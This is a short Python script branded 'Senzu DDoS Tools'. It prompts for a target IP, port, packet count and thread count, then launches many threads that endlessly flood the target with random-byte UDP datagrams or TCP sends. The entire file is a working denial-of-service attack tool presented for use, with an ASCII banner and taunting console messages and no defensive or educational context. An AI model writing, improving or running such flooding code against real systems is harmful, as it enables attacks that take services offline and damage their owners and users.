#Senzu
import random
import socket
import threading
import os
import sys

os.system("clear")


print("\033[92m╭━━━┳━━━┳━╮╱╭┳━━━━┳╮╱╭╮") 
print("\033[92m┃╭━╮┃╭━━┫┃╰╮┃┣━━╮━┃┃╱┃┃") 
print("\033[92m┃╰━━┫╰━━┫╭╮╰╯┃╱╭╯╭┫┃╱┃┃") 
print("\033[92m╰━━╮┃╭━━┫┃╰╮┃┃╭╯╭╯┃┃╱┃┃") 
print("\033[92m┃╰━╯┃╰━━┫┃╱┃┃┣╯━╰━┫╰━╯┃") 
print("\033[92m╰━━━┻━━━┻╯╱╰━┻━━━━┻━━━╯") 
print("\033[92m>>> Senzu DDoS Tools <<<") 
ip = str(input(" IP :"))
port = int(input(" Port :"))
choice = str(input(" GAS?? [ y / n ] :"))
times = int(input(" Packet : "))
threads = int(input(" Threads :"))
def run():
  data = random._urandom(1081)
  i = random.choice(("[$]","[π]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"[#] Senzu ATTACK!!!")
    except:
      print("MAMPUS!!!")

def run2():
  data = random._urandom(666)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +"Senzu!!!")
    except:
      s.close()
      print("[#] Error")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()